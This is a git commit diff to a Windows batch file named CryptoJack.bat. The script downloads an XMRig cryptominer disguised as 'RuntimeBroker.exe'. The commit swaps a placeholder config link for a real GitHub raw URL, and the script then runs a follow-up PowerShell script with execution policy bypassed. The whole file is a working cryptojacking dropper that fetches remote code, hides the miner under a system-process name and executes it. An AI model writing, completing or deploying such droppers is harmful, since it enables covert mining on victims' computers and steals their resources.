5b15462d994760206d74ac8863b30e6bc7abb030
Djokaj100 <164801869+Djokaj100@users.noreply.github.com>
2026-06-17 16:17:13 +0200

    Update CryptoJack.bat

--- CryptoJack.bat
+++ CryptoJack.bat
@@ -1,7 +1,7 @@
 @echo off
 :: Preuzimanje rudara i konfiguracije sa tvog GitHub-a
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_XMRIG', '%~dp0RuntimeBroker.exe')"
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_CONFIG', '%~dp0config.json')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Djokaj100/test-miner-projekt/refs/heads/main/config.json', '%~dp0config.json')"
 
 :: Pokretanje PowerShell skripte za instalaciju/izvrsavanje
 powershell -ExecutionPolicy Bypass -File "%~dp0CryptoJack1.ps1"
